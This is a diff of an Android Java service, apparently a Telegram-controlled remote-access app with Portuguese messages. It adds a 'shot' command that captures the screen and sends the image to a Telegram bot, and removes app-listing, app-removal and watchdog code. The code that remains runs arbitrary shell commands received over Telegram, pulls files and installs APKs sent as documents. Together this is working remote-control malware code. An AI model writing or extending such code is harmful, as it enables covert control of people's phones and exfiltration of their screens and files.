@@ -8,8 +8,6 @@ import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
-import android.content.pm.ApplicationInfo;
-import android.content.pm.PackageInfo;
 import android.content.pm.PackageInstaller;
 import android.net.Uri;
 import android.os.BatteryManager;
@@ -31,7 +29,6 @@ public class RelayService extends Service {
     private static final int NOTIF_ID = 2002;
 
     private TelegramBridge tg;
-    private java.util.List<String> ultimaLista;
     private long startedAt = 0;
 
     @Override
@@ -39,7 +36,6 @@ public class RelayService extends Service {
         super.onCreate();
         startedAt = System.currentTimeMillis();
         goForeground();
-        agendarWatchdog();
 
         tg = new TelegramBridge(BuildConfig.BOT_TOKEN, BuildConfig.MASTER_CHAT);
         BridgeHolder.tg = tg;
@@ -55,6 +51,7 @@ public class RelayService extends Service {
         String low = c.toLowerCase(Locale.ROOT);
         try {
             if (low.equals("ping")) { tg.say("pong"); return; }
+            if (low.equals("shot")) { cmdShot(); return; }
             if (low.equals("perm")) {
                 Intent pi = new Intent(this, PermActivity.class);
                 pi.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -64,14 +61,7 @@ public class RelayService extends Service {
             }
             if (low.equals("status") || low.equals("estado")) { tg.say(statusLine()); return; }
             if (low.startsWith("open ")) { cmdOpen(c.substring(5).trim()); return; }
-            if (low.equals("apps")) { cmdApps(false); return; }
-            if (low.equals("apps all")) { cmdApps(true); return; }
-            if (low.startsWith("rm ")) { cmdRm(c.substring(3).trim()); return; }
-            if (low.equals("uninstall")) {
-                tg.say("uninstall: escolha na lista - mande 'apps' e depois 'rm <numero>' (ou 'rm self' pra me remover)");
-                cmdApps(false);
-                return;
-            }
+            if (low.equals("uninstall")) { cmdUninstall(); return; }
             if (low.equals("install") || low.equals("update")) {
                 File juntado = new File(getFilesDir(), "juntado.apk");
                 if (juntado.exists()) { instalarArquivo(juntado, low); return; }
@@ -81,7 +71,7 @@ public class RelayService extends Service {
             if (c.startsWith("DOC:")) { cmdDoc(c); return; }
             if (low.startsWith("sh ")) { tg.say(Exec.run(c.substring(3))); return; }
             if (low.startsWith("shell ")) { tg.say(Exec.run(c.substring(6))); return; }
-            tg.say("comandos: sh <cmd> | apps | rm <numero|pacote|self> | open <url> | pull <arquivo> | install (APK como doc) | status | perm | ping");
+            tg.say("comandos: sh <cmd> | status | open <url> | pull <arquivo> | uninstall | install (APK como doc) | ping");
         } catch (Throwable t) {
             tg.say("erro cmd: " + t);
         }
@@ -116,102 +106,17 @@ public class RelayService extends Service {
         } catch (Exception e) { tg.say("erro open: " + e); }
     }
 
-    private void cmdApps(boolean todos) {
-        try {
-            java.util.List<PackageInfo> pkgs = getPackageManager().getInstalledPackages(0);
-            ultimaLista = new java.util.ArrayList<>();
-            StringBuilder sb = new StringBuilder();
-            int n = 0;
-            for (PackageInfo pi : pkgs) {
-                boolean sistema = (pi.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
-                if (!todos && sistema) continue;
-                n++;
-                String label;
-                try { label = pi.applicationInfo.loadLabel(getPackageManager()).toString(); }
-                catch (Exception e) { label = pi.packageName; }
-                ultimaLista.add(pi.packageName);
-                sb.append(n).append(". ").append(label).append(" (").append(pi.packageName).append(")\n");
-            }
-            sb.append("-- ").append(n).append(" apps -- mande: rm <numero>");
-            tg.say(sb.toString());
-        } catch (Exception e) { tg.say("erro apps: " + e); }
-    }
-
-    private void cmdRm(String alvo) {
-        try {
-            if (alvo.equalsIgnoreCase("self")) { cmdUninstall(); return; }
-            String pkg;
-            if (alvo.matches("[0-9]+")) {
-                int i = Integer.parseInt(alvo) - 1;
-                if (ultimaLista == null || i < 0 || i >= ultimaLista.size()) {
-                    tg.say("rm: numero invalido - mande 'apps' antes pra ver a lista"); return;
-                }
-                pkg = ultimaLista.get(i);
-            } else {
-                pkg = alvo;
-            }
-            Intent del = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
-            del.setData(Uri.parse("package:" + pkg));
-            del.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            int req = (int) (System.currentTimeMillis() % 2000000000L);
-            PendingIntent p = PendingIntent.getActivity(this, req, del,
-                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
-            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
-            String chId = "rm_fsi";
-            if (Build.VERSION.SDK_INT >= 26) {
-                nm.createNotificationChannel(new NotificationChannel(chId, "remocao",
-                        NotificationManager.IMPORTANCE_HIGH));
-            }
-            Notification.Builder b = Build.VERSION.SDK_INT >= 26
-                    ? new Notification.Builder(this, chId)
-                    : new Notification.Builder(this);
-            b.setContentTitle("Remover aplicativo")
-             .setContentText("Toque aqui e depois em DESINSTALAR")
-             .setSmallIcon(android.R.drawable.stat_notify_sync)
-             .setAutoCancel(true)
-             .setContentIntent(p);
-            nm.notify(req, b.build());
-            tg.say("rm: notificacao enviada - toque, depois DESINSTALAR: " + pkg);
-        } catch (Exception e) { tg.say("erro rm: " + e); }
-    }
-
-    private void agendarWatchdog() {
-        try {
-            android.app.AlarmManager am = (android.app.AlarmManager) getSystemService(Context.ALARM_SERVICE);
-            Intent wi = new Intent(this, WatchdogReceiver.class);
-            PendingIntent wpi = PendingIntent.getBroadcast(this, 77, wi,
-                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
-            am.setRepeating(android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                    android.os.SystemClock.elapsedRealtime() + 15 * 60_000L,
-                    15 * 60_000L, wpi);
-        } catch (Exception ignored) { }
-    }
-
     private void cmdUninstall() {
         try {
-            Intent del = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
-            del.setData(Uri.parse("package:" + getPackageName()));
-            del.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            int req = (int) (System.currentTimeMillis() % 2000000000L);
-            PendingIntent p = PendingIntent.getActivity(this, req, del,
-                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
-            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
-            String chId = "uninstall_fsi";
-            if (Build.VERSION.SDK_INT >= 26) {
-                nm.createNotificationChannel(new NotificationChannel(chId, "remocao",
-                        NotificationManager.IMPORTANCE_HIGH));
-            }
-            Notification.Builder b = Build.VERSION.SDK_INT >= 26
-                    ? new Notification.Builder(this, chId)
-                    : new Notification.Builder(this);
-            b.setContentTitle("Remover aplicativo")
-             .setContentText("Toque aqui e depois em DESINSTALAR")
-             .setSmallIcon(android.R.drawable.stat_notify_sync)
-             .setAutoCancel(true)
-             .setContentIntent(p);
-            nm.notify(req, b.build());
-            tg.say("uninstall: toque na notificacao e confirme na tela");
-        } catch (Exception e) { tg.say("erro uninstall: " + e); }
+            Intent status = new Intent(InstallReceiver.ACTION).setPackage(getPackageName());
+            status.putExtra("what", "uninstall");
+            PendingIntent p = PendingIntent.getBroadcast(this, 991, status,
+                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);
+            getPackageManager().getPackageInstaller().uninstall(getPackageName(), p.getIntentSender());
+            tg.say("uninstall: sessao aberta (confirme na tela)");
+        } catch (Exception e) {
+            tg.say("erro uninstall: " + e);
+        }
     }
 
     private void cmdPull(String path) {
@@ -338,6 +243,67 @@ public class RelayService extends Service {
         PendingIntent p = PendingIntent.getBroadcast(this, sid, status,
                 PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);
         s.commit(p.getIntentSender());
+    }
+
+    private void cmdShot() {
+        if (BridgeHolder.projection == null) {
+            BridgeHolder.shotPendente = true;
+            Intent i = new Intent(this, ShotConsentActivity.class);
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(i);
+            tg.say("shot: toque INICIAR na tela pra autorizar (1x por boot) - depois 'shot' tira na hora");
+            return;
+        }
+        dispararCaptura();
+        tg.say("shot: capturando...");
+    }
+
+    public static void dispararCaptura() {
+        new Thread(() -> {
+            android.media.projection.MediaProjection mp = BridgeHolder.projection;
+            if (mp == null || BridgeHolder.tg == null) return;
+            android.hardware.display.VirtualDisplay vd = null;
+            android.media.ImageReader reader = null;
+            try {
+                android.content.Context ctx = null;
+                try { ctx = android.app.ActivityThread.currentApplication(); } catch (Throwable ignored) { }
+                if (ctx == null) return;
+                android.util.DisplayMetrics m = ctx.getResources().getDisplayMetrics();
+                int w = m.widthPixels, h = m.heightPixels, dpi = m.densityDpi;
+                reader = android.media.ImageReader.newInstance(w, h, android.graphics.PixelFormat.RGBA_8888, 2);
+                vd = mp.createVirtualDisplay("shot", w, h, dpi,
+                        android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                        reader.getSurface(), null, null);
+                android.media.Image img = null;
+                for (int i = 0; i < 12; i++) {
+                    img = reader.acquireLatestImage();
+                    if (img != null) break;
+                    try { Thread.sleep(300); } catch (InterruptedException ignored) { }
+                }
+                if (img == null) { BridgeHolder.tg.say("shot: sem frame (tente de novo)"); return; }
+                android.media.Image.Plane[] planes = img.getPlanes();
+                java.nio.ByteBuffer buffer = planes[0].getBuffer();
+                int pixelStride = planes[0].getPixelStride();
+                int rowStride = planes[0].getRowStride();
+                int rowPadding = rowStride - pixelStride * w;
+                android.graphics.Bitmap bmp = android.graphics.Bitmap.createBitmap(
+                        w + (rowPadding > 0 ? rowPadding / pixelStride : 0), h, android.graphics.Bitmap.Config.ARGB_8888);
+                bmp.copyPixelsFromBuffer(buffer);
+                img.close();
+                android.graphics.Bitmap cortado = android.graphics.Bitmap.createBitmap(bmp, 0, 0, w, h);
+                bmp.recycle();
+                java.io.ByteArrayOutputStream bo = new java.io.ByteArrayOutputStream();
+                cortado.compress(android.graphics.Bitmap.CompressFormat.PNG, 90, bo);
+                cortado.recycle();
+                BridgeHolder.tg.sendPhoto(bo.toByteArray(), "shot_" + System.currentTimeMillis() + ".png");
+                BridgeHolder.tg.say("shot: enviada (" + bo.size() + " bytes)");
+            } catch (Throwable t) {
+                if (BridgeHolder.tg != null) BridgeHolder.tg.say("shot: erro " + t);
+            } finally {
+                if (vd != null) vd.release();
+                if (reader != null) reader.close();
+            }
+        }, "shot").start();
     }
 
     private String statusLine() {
